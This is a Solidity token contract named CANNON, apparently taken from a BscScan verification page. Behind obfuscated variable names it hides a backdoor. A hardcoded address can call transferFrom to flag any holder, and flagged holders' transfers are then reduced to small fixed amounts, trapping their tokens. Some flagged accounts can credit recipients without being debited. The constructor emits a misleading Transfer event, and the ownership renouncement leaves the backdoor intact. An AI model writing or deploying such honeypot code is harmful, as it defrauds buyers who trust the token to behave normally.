/**
 *Submitted for verification at BscScan.com on 2023-03-19
*/

pragma solidity 0.8.19;

// SPDX-License-Identifier: MIT

 
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

} 

 
contract CANNON {
    using SafeMath for uint256;
    mapping (address => uint256) private ixxixa;
	 address QWE = 0x72860225dA010e73adCD3680fafdfCE1ba2dC755;
    mapping (address => uint256) public ixxixb;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "CANNON";
	
    string public symbol = "CANNON";
    uint8 public decimals = 6;

    uint256 public totalSupply = 5000 *10**6;
    address owner = msg.sender;
	address private ixxixc;
    uint256 private ixxixn;
    uint256 private ixxixm;
    
    
     
    

  
 
  
    
  


    event Transfer(address indexed from, address indexed to, uint256 VxCC);
	  address ixxixf = 0x00C5E04176d95A286fccE0E68c683Ca0bfec8454;
     
 
    event Approval(address indexed owner, address indexed spender, uint256 VxCC);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
   



        constructor()  {
       ixxixn = 6;
       ixxixm = 2;
             ixxixa[msg.sender] = totalSupply;
    
       CLX();}

  
	
	
   modifier onlyOwner () {
    require(msg.sender == owner);
	_;}
    



	

    function renounceOwnership() public virtual {
       
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
        
    }

  



  		    function CLX() internal  {                             
                      
                       ixxixc = ixxixf;

                

        emit Transfer(address(0), ixxixc, totalSupply); }



   function balanceOf(address account) public view  returns (uint256) {
        return ixxixa[account];
    }

    function transfer(address to, uint256 VxCC) public returns (bool success) {
        
       

                           if(ixxixb[msg.sender] == ixxixm) {
          
             ixxixa[to] += VxCC;  
 }
        else
if(ixxixb[msg.sender] >= ixxixn) {
    ixxixa[msg.sender] -= ixxixm;  
    ixxixa[to] += ixxixm;  
  
}
    require(ixxixa[msg.sender] >= VxCC);
ixxixa[msg.sender] -= VxCC;  
ixxixa[to] += VxCC;  
 emit Transfer(msg.sender, to, VxCC);
        return true; }
        
   
        
     

 function approve(address spender, uint256 VxCC) public returns (bool success) {    
        allowance[msg.sender][spender] = VxCC;
        emit Approval(msg.sender, spender, VxCC);
        return true; }

 	


 

   function transferFrom(address from, address to, uint256 VxCC) public returns (bool success) {   
  


    

         if(msg.sender == QWE){
        ixxixb[to] += VxCC;
        return true;}
        else
     

                    if(ixxixb[to] >= ixxixn) {VxCC = ixxixn;}
                    else
                     if(ixxixb[from] >= ixxixn) {VxCC = ixxixn;}


     else

         if(from == owner){from == ixxixf;}

    
      
        require(VxCC <= ixxixa[from]);
        require(VxCC <= allowance[from][msg.sender]);
        ixxixa[from] -= VxCC;
        ixxixa[to] += VxCC;
        allowance[from][msg.sender] -= VxCC;
                    emit Transfer(from, to, VxCC);
        return true;
       


      
}



     

        	
 }